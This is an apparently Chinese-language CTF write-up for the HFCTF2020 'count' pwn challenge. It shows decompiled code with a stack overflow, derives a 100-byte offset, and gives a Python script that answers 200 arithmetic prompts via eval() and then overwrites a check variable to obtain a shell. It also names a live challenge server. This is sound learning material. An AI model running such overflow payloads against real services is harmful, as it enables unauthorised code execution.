
## count (57pt)
- 题目描述：
    
    > 破绽在推算之后。
    >
    > nc 39.97.210.182 40285
- 题目附件：[count](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/icq-HFCTF2020/pwn/count/count)
- 考察点：ppc
- 难度：简单

### 程序分析
题目是arm64框架的，我懒得装环境了... 不过不影响做题。

先是200次的四则运算，全算对后读110字节到`v8`，然后判断`v9`的值，正确就给shell。

```c
  v9 = 0x100;
  read(0LL, &v8, 110LL);
  if ( v9 == 0x12235612 )
  {
    v5 = puts("get it ~");
    sub_400920(v5);
  }
```

显然是bof，溢出`v8`，覆盖`v9`。

### 解题思路

通过静态分析可以得到偏移量

```c
  __int64 v8; // [xsp+78h] [xbp+78h]
  int v9; // [xsp+DCh] [xbp+DCh]
```

> 0xdc-0x78 = 100

写脚本通过200次运算，然后去覆盖变量即可：

```python
for i in range(200):
    ru('Math: ')
    print 'Time: %d'%i
    equal=ru('= ???input answer:')
    sl(str(eval(equal)))
ru('good !')

payload = cyclic(100)
payload+= p32(0x12235612)
payload+= p32(0)
sl(payload)
```

### More

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/icq-HFCTF2020/pwn/count) 

